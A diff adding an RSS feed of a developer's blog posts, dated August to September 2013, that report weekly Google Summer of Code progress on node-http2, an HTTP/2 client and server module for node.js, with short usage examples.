+      &lt;li&gt;&lt;a href=&quot;https://github.com/molnarg/node-http2&quot;&gt;node-http2&lt;/a&gt; : an HTTP/2 client and server implementation for node.js&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;https://github.com/molnarg/http2-testpage&quot;&gt;http2-testpage&lt;/a&gt; : a test server for testing client side HTTP/2 implementations&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;3147 lines of code (the main HTTP/2 implementation code)&lt;/li&gt;
+  &lt;li&gt;2647 lines of test (in 94 node-http2 unit tests, and 32 http2-testpage testcases, providing ~90% &lt;a href=&quot;https://github.com/molnarg/node-http2#test-coverage&quot;&gt;code coverage&lt;/a&gt;)&lt;/li&gt;
+  &lt;li&gt;1426 lines of code comment (base of the generated &lt;a href=&quot;http://molnarg.github.io/node-http2/doc/&quot;&gt;developer documentation&lt;/a&gt; and &lt;a href=&quot;https://github.com/molnarg/node-http2/wiki/Public-API&quot;&gt;API reference&lt;/a&gt;)&lt;/li&gt;
+  &lt;li&gt;502 &lt;a href=&quot;https://github.com/molnarg/node-http2/commits/master&quot;&gt;commits&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;16 &lt;a href=&quot;/blog/categories/google-summer-of-code/&quot;&gt;blog posts&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;15 &lt;a href=&quot;https://github.com/molnarg/node-http2/releases&quot;&gt;releases&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;launched the second public HTTP/2 server ever (after Microsoft’s &lt;a href=&quot;https://github.com/MSOpenTech/http2-katana&quot;&gt;http2-katana&lt;/a&gt; test server)&lt;/li&gt;
+  &lt;li&gt;with the help of one great mentor :)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;My http2 node.js module is ready to use, and I don’t plan to break the API in the foreseeable future, so I tagged last week’s release as 1.0.0. As most 1.0.0 software releases, this is the end of a long process, but certainly not the end of the work. There are still lot of things to do:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;continuously upgrading to the latest draft of the standard (current draft: &lt;a href=&quot;http://tools.ietf.org/html/draft-ietf-httpbis-http2-06&quot;&gt;draft-ietf-httpbis-http2-06&lt;/a&gt;)&lt;/li&gt;
+  &lt;li&gt;fixing the issues that come up when more and more people start using this module&lt;/li&gt;
+  &lt;li&gt;implementing the few &lt;a href=&quot;https://github.com/molnarg/node-http2/issues?labels=feature&quot;&gt;missing features&lt;/a&gt; (the most important one is the &lt;a href=&quot;https://github.com/molnarg/node-http2/issues/5&quot;&gt;TLS ALPN support&lt;/a&gt;)&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/molnarg/node-http2/issues?labels=performance&quot;&gt;performance optimization&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I will keep maintaining this module in my free time, so expect regular updates in the future too :)&lt;/p&gt;
+
+&lt;p&gt;I would like to say thank you to all the amazing people who made all of this possible, especially Nick Hurley of Mozilla, my mentor, who spent countless hours with reviewing my code, listening to my problems and giving advice.&lt;/p&gt;
+
+</description>
+        <pubDate>Wed, 25 Sep 2013 20:39:00 +0200</pubDate>
+        <link>http://gabor.molnar.es/blog/2013/09/25/gsoc-wrap-up/</link>
+        <guid isPermaLink="true">http://gabor.molnar.es/blog/2013/09/25/gsoc-wrap-up/</guid>
+        
+        
+        <category>google summer of code</category>
+        
+      </item>
+    
+      <item>
+        <title>GSoC week #13</title>
+        <description>&lt;p&gt;This is the summary of the 13. week of my Google Summer of Code project: &lt;a href=&quot;https://google-melange.appspot.com/gsoc/project/google/gsoc2013/molnarg/5001&quot;&gt;HTTP/2 prototype server implementation in node.js&lt;/a&gt;.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;This week was about making node-http2 fast, and starting work on a new project: &lt;a href=&quot;https://github.com/molnarg/http2-testpage&quot;&gt;http2-testpage&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;It all began with a &lt;a href=&quot;https://github.com/molnarg/node-http2/issues/47&quot;&gt;GitHub issue&lt;/a&gt; opened by &lt;a href=&quot;https://twitter.com/tatsuhiro_t&quot;&gt;Tatsuhiro Tsujikawa&lt;/a&gt; (creator of &lt;a href=&quot;https://github.com/tatsuhiro-t/spdylay&quot;&gt;spdylay&lt;/a&gt; and &lt;a href=&quot;https://github.com/tatsuhiro-t/nghttp2&quot;&gt;nghttp2&lt;/a&gt;). It took lot of time to fix it, but then I was so deep into this performance optimization thing that I continued with other improvements. The optimizations were all based on CPU profiling data collected using &lt;a href=&quot;https://github.com/c4milo/node-webkit-agent&quot;&gt;node-webkit-agent&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;The result is that it now takes 2 seconds to serve 600 small parallel request from the same client, while it took so long before that I could not even wait for it to complete. It’s great improvement, but I still plan to further optimize this, since there’s still room for improvements. I also plan to post about the lessons learned during the process sometime next week.&lt;/p&gt;
+
+&lt;p&gt;Other than that, I started &lt;a href=&quot;https://github.com/molnarg/http2-testpage&quot;&gt;http2-testpage&lt;/a&gt;. It’s a tool that injects intentional failures into HTTP/2 connections to test clients’ reaction. The next week will be dedicated to working on this.&lt;/p&gt;
+
+&lt;p&gt;As usual, the latest code is published on npm (&lt;code&gt;npm install http2&lt;/code&gt; and &lt;code&gt;npm install http2-testpage&lt;/code&gt;). The &lt;a href=&quot;http://molnarg.github.io/node-http2/doc/&quot;&gt;hosted version of the docs&lt;/a&gt; and the &lt;a href=&quot;https://gabor.molnar.es:8080&quot;&gt;prototype public server&lt;/a&gt; was updated as well.&lt;/p&gt;
+
+</description>
+        <pubDate>Sun, 15 Sep 2013 22:00:00 +0200</pubDate>
+        <link>http://gabor.molnar.es/blog/2013/09/15/gsoc-week-number-13/</link>
+        <guid isPermaLink="true">http://gabor.molnar.es/blog/2013/09/15/gsoc-week-number-13/</guid>
+        
+        
+        <category>google summer of code</category>
+        
+      </item>
+    
+      <item>
+        <title>GSoC week #12</title>
+        <description>&lt;p&gt;This is the summary of the 12. week of my Google Summer of Code project: &lt;a href=&quot;https://google-melange.appspot.com/gsoc/project/google/gsoc2013/molnarg/5001&quot;&gt;HTTP/2 prototype server implementation in node.js&lt;/a&gt;.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;The main item that I got done this week was the upgrade to the latest draft of the spec: &lt;a href=&quot;http://tools.ietf.org/html/draft-ietf-httpbis-http2-06&quot;&gt;draft-ietf-httpbis-http2-06&lt;/a&gt;. This was a really smooth transition.&lt;/p&gt;
+
+&lt;p&gt;I had to rewrite a large part of the &lt;a href=&quot;http://molnarg.github.io/node-http2/doc/compressor.html&quot;&gt;compression code&lt;/a&gt;, but that was expected. I have to say that I like the &lt;a href=&quot;http://tools.ietf.org/html/draft-ietf-httpbis-header-compression-03&quot;&gt;current version of the compression spec&lt;/a&gt; much better than previous versions. The text is much cleaner and it finally allows the building of a streaming header encoder and decoder implementation. The new implementation is therefore consists of a pair of transform streams that do the compression/decompression. The decompressor is in fact just buffering the input and then processing it in one large batch at the end, but fixing that is already on my todo list (&lt;a href=&quot;https://github.com/molnarg/node-http2/issues/46&quot;&gt;issue #46&lt;/a&gt;). The next step would be exposing these streaming interfaces on the public API.&lt;/p&gt;
+
+&lt;p&gt;For the next week, I’d like to finally start implementing a HTTP/2 test page for browsers (using the to-be-done &lt;a href=&quot;https://github.com/molnarg/node-http2/issues/33&quot;&gt;failure injection capability&lt;/a&gt;). It has been on the table for a long time now, but I think that the time has come to finally start working on this.&lt;/p&gt;
+
+&lt;p&gt;As usual, the latest code is published on npm, and the &lt;a href=&quot;http://molnarg.github.io/node-http2/doc/&quot;&gt;hosted version of the docs&lt;/a&gt;. The &lt;a href=&quot;https://gabor.molnar.es:8080&quot;&gt;prototype public server&lt;/a&gt; is down at the moment, but will be up, and updated soon!&lt;/p&gt;
+
+</description>
+        <pubDate>Mon, 09 Sep 2013 22:58:00 +0200</pubDate>
+        <link>http://gabor.molnar.es/blog/2013/09/09/gsoc-week-number-12/</link>
+        <guid isPermaLink="true">http://gabor.molnar.es/blog/2013/09/09/gsoc-week-number-12/</guid>
+        
+        
+        <category>google summer of code</category>
+        
+      </item>
+    
+      <item>
+        <title>GSoC week #11</title>
+        <description>&lt;p&gt;This is the summary of the 11. week of my Google Summer of Code project: &lt;a href=&quot;https://google-melange.appspot.com/gsoc/project/google/gsoc2013/molnarg/5001&quot;&gt;HTTP/2 prototype server implementation in node.js&lt;/a&gt;.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;The focus of this week was testing: I wrote lots of unit tests to achieve 80% for every test coverage metric on every submodule.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/test-coverage.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This led to lot of bugfixes. For example, I was able to fix the issue with push requests I saw last week when testing with Firefox. Additionally, I discovered that node’s NPN implementation does not always work well, and opened a &lt;a href=&quot;https://github.com/joyent/node/issues/6168&quot;&gt;ticket&lt;/a&gt; for this issue.&lt;/p&gt;
+
+&lt;p&gt;Main work items for the next week are:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/molnarg/node-http2/issues/39&quot;&gt;update to the -06 version of the draft&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;start working on a HTTP/2 test page for browsers (using the to-be-done &lt;a href=&quot;https://github.com/molnarg/node-http2/issues/33&quot;&gt;failure injection capability&lt;/a&gt;)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;As usual, the latest code is published on npm (just type &lt;code&gt;npm install http2&lt;/code&gt; to install it), and the &lt;a href=&quot;http://molnarg.github.io/node-http2/doc/&quot;&gt;hosted version of the docs&lt;/a&gt; and the &lt;a href=&quot;https://gabor.molnar.es:8080&quot;&gt;prototype public server&lt;/a&gt; was updated as well.&lt;/p&gt;
+</description>
+        <pubDate>Tue, 03 Sep 2013 22:46:00 +0200</pubDate>
+        <link>http://gabor.molnar.es/blog/2013/09/03/gsoc-week-number-11/</link>
+        <guid isPermaLink="true">http://gabor.molnar.es/blog/2013/09/03/gsoc-week-number-11/</guid>
+        
+        
+        <category>google summer of code</category>
+        
+      </item>
+    
+      <item>
+        <title>GSoC week #10</title>
+        <description>&lt;p&gt;This is the summary of the 10. week of my Google Summer of Code project: &lt;a href=&quot;https://google-melange.appspot.com/gsoc/project/google/gsoc2013/molnarg/5001&quot;&gt;HTTP/2 prototype server implementation in node.js&lt;/a&gt;.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;The biggest work item I got done this week is &lt;a href=&quot;https://github.com/molnarg/node-http2/issues/19&quot;&gt;the&lt;/a&gt; &lt;a href=&quot;https://github.com/molnarg/node-http2/issues/20&quot;&gt;prioritization&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Besides that, I worked on &lt;a href=&quot;https://github.com/molnarg/node-http2/issues/32&quot;&gt;API compatibility&lt;/a&gt;. That means that the &lt;a href=&quot;https://github.com/molnarg/node-http2/wiki/Public-API&quot;&gt;node-http2 API&lt;/a&gt; now looks very similar to the standard node.js HTTP API.&lt;/p&gt;
+
+&lt;p&gt;Goals for the next week is &lt;a href=&quot;https://github.com/molnarg/node-http2/issues/43&quot;&gt;improving test coverage&lt;/a&gt;, and starting work on a HTTP/2 test service with &lt;a href=&quot;https://github.com/molnarg/node-http2/issues/33&quot;&gt;failure injection&lt;/a&gt; capability. Failure injection makes it possible to test how HTTP/2 implementations react to malfunctioning peers. Testing browsers with a failure injection tool is one of the main goals of this project, so it’s quite important to get right. Possible error scenarios are collected &lt;a href=&quot;https://github.com/molnarg/node-http2/wiki/Error-Scenarios&quot;&gt;in the wiki&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;As usual, the latest code is published on npm (just type &lt;code&gt;npm install http2&lt;/code&gt; to install it), and the &lt;a href=&quot;http://molnarg.github.io/node-http2/doc/&quot;&gt;hosted version of the docs&lt;/a&gt; and the &lt;a href=&quot;https://gabor.molnar.es:8080&quot;&gt;prototype public server&lt;/a&gt; was updated as well.&lt;/p&gt;
+
+</description>
+        <pubDate>Tue, 27 Aug 2013 22:35:00 +0200</pubDate>
+        <link>http://gabor.molnar.es/blog/2013/08/27/gsoc-week-number-10/</link>
+        <guid isPermaLink="true">http://gabor.molnar.es/blog/2013/08/27/gsoc-week-number-10/</guid>
+        
+        
+        <category>google summer of code</category>
+        
+      </item>
+    
+      <item>
+        <title>GSoC week #9</title>
+        <description>&lt;p&gt;This is the summary of the 9. week of my Google Summer of Code project: &lt;a href=&quot;https://google-melange.appspot.com/gsoc/project/google/gsoc2013/molnarg/5001&quot;&gt;HTTP/2 prototype server implementation in node.js&lt;/a&gt;.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;The focus of this week was improving the top layer of the stack: the public API and the mapping of HTTP concepts to HTTP/2 streams.&lt;/p&gt;
+
+&lt;p&gt;Besides that, with the help of Patrick McManus from the Mozilla networking team, I managed to get node-http2 to work with the &lt;a href=&quot;https://wiki.mozilla.org/Networking/http2&quot;&gt;latest HTTP/2 development build of Firefox&lt;/a&gt;! In the process we also discovered a bug in Firefox’s header compression implementation. If you follow this blog you’ve probably seen the proof, but here it is again :)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/node-http2-loves-firefox.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Improving the top layer meant&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/molnarg/node-http2/issues/26&quot;&gt;implementation of connection pooling&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/molnarg/node-http2/issues/31&quot;&gt;exposing server push&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/molnarg/node-http2/issues/27&quot;&gt;adding logging&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/molnarg/node-http2/issues/32&quot;&gt;lot of work on API compatibility with the standard HTTPS module&lt;/a&gt; (full API compatibility is not achieved yet, but should not be long time before it will be)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;What I did not have time for is &lt;a href=&quot;https://github.com/molnarg/node-http2/issues/20&quot;&gt;implementing&lt;/a&gt; &lt;a href=&quot;https://github.com/molnarg/node-http2/issues/19&quot;&gt;prioritization&lt;/a&gt;, which is the main goal for the following days. If I have more time this week, the next thing on my TODO list is an &lt;a href=&quot;https://github.com/molnarg/node-http2/issues/33&quot;&gt;API for intentional failure injection&lt;/a&gt;. This would make it possible to write a server that tests its clients’ error handling capabilities.&lt;/p&gt;
+
+&lt;p&gt;As usual, the latest code is published on npm (just type &lt;code&gt;npm install http2&lt;/code&gt; to install it), and the &lt;a href=&quot;http://molnarg.github.io/node-http2/doc/&quot;&gt;hosted version of the docs&lt;/a&gt; and the &lt;a href=&quot;https://gabor.molnar.es:8080&quot;&gt;prototype public server&lt;/a&gt; was updated as well.&lt;/p&gt;
+
+</description>
+        <pubDate>Mon, 19 Aug 2013 21:46:00 +0200</pubDate>
+        <link>http://gabor.molnar.es/blog/2013/08/19/gsoc-week-number-9/</link>
+        <guid isPermaLink="true">http://gabor.molnar.es/blog/2013/08/19/gsoc-week-number-9/</guid>
+        
+        
+        <category>google summer of code</category>
+        
+      </item>
+    
+      <item>
+        <title>node-http2 ♥ Firefox</title>
+        <description>&lt;p&gt;&lt;img src=&quot;/img/node-http2-loves-firefox.png&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Thu, 15 Aug 2013 15:41:00 +0200</pubDate>
+        <link>http://gabor.molnar.es/blog/2013/08/15/node-http2-loves-firefox/</link>
+        <guid isPermaLink="true">http://gabor.molnar.es/blog/2013/08/15/node-http2-loves-firefox/</guid>
+        
+        
+        <category>google summer of code</category>
+        
+      </item>
+    
+      <item>
+        <title>GSoC week #8</title>
+        <description>&lt;p&gt;This is the summary of the 8. week of my Google Summer of Code project: &lt;a href=&quot;https://google-melange.appspot.com/gsoc/project/google/gsoc2013/molnarg/5001&quot;&gt;HTTP/2 prototype server implementation in node.js&lt;/a&gt;.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;The two main topics of this week was: testing and flow control.&lt;/p&gt;
+
+&lt;p&gt;I participated remotely on the interoperability testing that was organized on the second day of the &lt;a href=&quot;https://github.com/http2/wg_materials/blob/master/interim-13-08/agenda.md&quot;&gt;HTTPBis Interim Meeting in Hamburg&lt;/a&gt;. Working with &lt;a href=&quot;https://twitter.com/tatsuhiro_t&quot;&gt;Tatsuhiro Tsujikawa&lt;/a&gt; (&lt;a href=&quot;https://github.com/tatsuhiro-t/nghttp2&quot;&gt;nghttp2&lt;/a&gt;), &lt;a href=&quot;https://twitter.com/jovi0608&quot;&gt;Shigeki Ohtsu&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/fakalin&quot;&gt;Fred Akalin&lt;/a&gt; (Chrome) helped to discover a few bugs in both mine and their implementation. The public server set up last week proved to very useful for testing. This screenshot is made by Fred with an experimental build of Chrome:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/gabor_interop.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There were several corner cases in flow control that were not handled well, and I believe that these are solved now. In the process of solving these, the flow control implementation of the &lt;a href=&quot;http://molnarg.github.io/node-http2/doc/connection.html&quot;&gt;Connection&lt;/a&gt; and the &lt;a href=&quot;http://molnarg.github.io/node-http2/doc/stream.html&quot;&gt;Stream class&lt;/a&gt; were merged into a common parent class: &lt;a href=&quot;http://molnarg.github.io/node-http2/doc/flow.html&quot;&gt;Flow&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;I try to constantly improve the developer documentation, and as part this, I documented the APIs of the Stream, the Connection and the Flow classes. I also added two nice &lt;a href=&quot;http://molnarg.github.io/node-http2/doc/stream.html#section-14&quot;&gt;ASCII art&lt;/a&gt; &lt;a href=&quot;http://molnarg.github.io/node-http2/doc/flow.html#section-14&quot;&gt;figures&lt;/a&gt; to make reading the source code less boring :)&lt;/p&gt;
+
+&lt;p&gt;For the next week, I plan to &lt;a href=&quot;https://github.com/molnarg/node-http2/issues/26&quot;&gt;improve the&lt;/a&gt; &lt;a href=&quot;https://github.com/molnarg/node-http2/issues/32&quot;&gt;public API&lt;/a&gt;, &lt;a href=&quot;https://github.com/molnarg/node-http2/issues/31&quot;&gt;expose server push&lt;/a&gt;, and &lt;a href=&quot;https://github.com/molnarg/node-http2/issues/20&quot;&gt;implement&lt;/a&gt; &lt;a href=&quot;https://github.com/molnarg/node-http2/issues/19&quot;&gt;prioritization&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;As usual, the latest code is published on npm (just type &lt;code&gt;npm install http2&lt;/code&gt; to install it), and the &lt;a href=&quot;http://molnarg.github.io/node-http2/doc/&quot;&gt;hosted version of the docs&lt;/a&gt; and the &lt;a href=&quot;https://gabor.molnar.es:8080&quot;&gt;prototype public server&lt;/a&gt; was updated as well.&lt;/p&gt;
+
+</description>
+        <pubDate>Mon, 12 Aug 2013 22:36:00 +0200</pubDate>
+        <link>http://gabor.molnar.es/blog/2013/08/12/gsoc-week-number-8/</link>
+        <guid isPermaLink="true">http://gabor.molnar.es/blog/2013/08/12/gsoc-week-number-8/</guid>
+        
+        
+        <category>google summer of code</category>
+        
+      </item>
+    
+      <item>
+        <title>GSoC week #6 and #7</title>
+        <description>&lt;p&gt;This is the summary of the sixth and seventh week of my Google Summer of Code project: &lt;a href=&quot;https://google-melange.appspot.com/gsoc/project/google/gsoc2013/molnarg/5001&quot;&gt;HTTP/2 prototype server implementation in node.js&lt;/a&gt;.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;The summary for the sixth week is short: I’ve had summer holiday :) Next week marked a quite big milestone for the project: having a public API and launching a public test server!&lt;/p&gt;
+
+&lt;p&gt;The public API is very similar to the &lt;a href=&quot;http://nodejs.org/api/https.html&quot;&gt;standard node.js HTTPS API&lt;/a&gt;. The goal is to achieve perfect API compatibility, and to add HTTP/2 related stuff as extension to the API. Currently, there’s o public API for server push, but that’s probably coming this week.&lt;/p&gt;
+
+&lt;p&gt;A short example of using node-http2 as client:&lt;/p&gt;
+
+&lt;p&gt;```javascript
+var http2 = require(‘http2’);&lt;/p&gt;
+
+&lt;p&gt;var request = http2.request({
+  method: ‘get’,
+  host: ‘gabor.molnar.es’,
+  port: 8080,
+  url: ‘/’,
+  rejectUnauthorized: false
+});
+request.end();&lt;/p&gt;
+
+&lt;p&gt;request.on(‘response’, function(response) {
+  response.pipe(process.stdout);
+});
+```&lt;/p&gt;
+
+&lt;p&gt;Using as server:&lt;/p&gt;
+
+&lt;p&gt;```javascript
+var http2 = require(‘http2’);&lt;/p&gt;
+
+&lt;p&gt;var options = {
+  key: fs.readFileSync(‘./example/localhost.key’),
+  cert: fs.readFileSync(‘./example/localhost.crt’)
+};&lt;/p&gt;
+
+&lt;p&gt;http2.http.createServer(options, function(request, response) {
+  response.end(‘Hello world!’);
+}).listen(8080);
+```&lt;/p&gt;
+
+&lt;p&gt;Simple isn’t it?&lt;/p&gt;
+
+&lt;p&gt;I’ve also set up a public server at &lt;a href=&quot;https://gabor.molnar.es:8080&quot;&gt;https://gabor.molnar.es:8080&lt;/a&gt;. This serves up the same content (the blog) as the main server at port 80, but it is possible to negotiate HTTP/2 using the TLS NPN extension (no ALPN support yet). If the client does not support HTTP/2 then it falls back to simple HTTPS, so you should be able to see the served content even if the client does not support HTTP/2 yet!&lt;/p&gt;
+
+&lt;p&gt;That’s it for now. I decided to use GitHub issues to maintain a TODO list, so have a look at the &lt;a href=&quot;https://github.com/molnarg/node-http2/issues&quot;&gt;issues page&lt;/a&gt; if you want to se what’s ahead. Please open an issue or &lt;a href=&quot;&amp;#109;&amp;#097;&amp;#105;&amp;#108;&amp;#116;&amp;#111;:&amp;#103;&amp;#097;&amp;#098;&amp;#111;&amp;#114;&amp;#064;&amp;#109;&amp;#111;&amp;#108;&amp;#110;&amp;#097;&amp;#114;&amp;#046;&amp;#101;&amp;#115;&quot;&gt;email me&lt;/a&gt; directly if you find issues while testing.&lt;/p&gt;
+
+&lt;p&gt;As usual, the latest code is published on npm (just type &lt;code&gt;npm install http2&lt;/code&gt; to install it), and the &lt;a href=&quot;http://molnarg.github.io/node-http2/doc/&quot;&gt;hosted version of the docs&lt;/a&gt; was updated as well.&lt;/p&gt;
+</description>
+        <pubDate>Mon, 05 Aug 2013 23:01:00 +0200</pubDate>
+        <link>http://gabor.molnar.es/blog/2013/08/05/gsoc-week-number-6-and-number-7/</link>
+        <guid isPermaLink="true">http://gabor.molnar.es/blog/2013/08/05/gsoc-week-number-6-and-number-7/</guid>
+        
+        
+        <category>google summer of code</category>
+        
+      </item>
+    
+  </channel>
+</rss>
